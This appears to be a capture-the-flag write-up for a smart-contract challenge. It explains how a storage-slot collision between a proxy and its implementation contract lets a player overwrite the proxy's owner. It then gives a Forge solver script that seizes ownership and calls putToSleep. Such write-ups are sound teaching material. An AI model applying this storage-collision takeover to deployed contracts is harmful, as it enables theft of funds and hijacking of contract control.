## Weakness  
There are two contracts in the task.  
One is a proxy contract, the second is an implementation contract, the second
proxy contract uses the code of the implementation contract and its storage.  
According to the logic of the implementation code, it is possible to write to
the same slot that is used in the proxy contract to determine the owner.

## Exploit

```solidity  
// SPDX-License-Identifier: UNLICENSED  
pragma solidity ^0.8.13;

import "forge-ctf/CTFSolver.sol";  
import "forge-std/console.sol";  
import "src/Setup.sol";

contract Solve is CTFSolver {  
   function solve(address challenge, address player) internal override {  
       Setup setup = Setup(challenge);  
       Guardian guardian = setup.TARGET();  
       GlacierVault glacier = GlacierVault(address(guardian));  
       GlacierVault glacierImpl = GlacierVault(address(guardian.implementation_addr()));  
       glacier.quickStore{value: 1337}(0, uint256(uint160(player)));  
       guardian.putToSleep();  
       console.log("Guardian Owner", guardian.owner());  
       console.log("Guardian Asleep", guardian.asleep());  
   }  
}  
```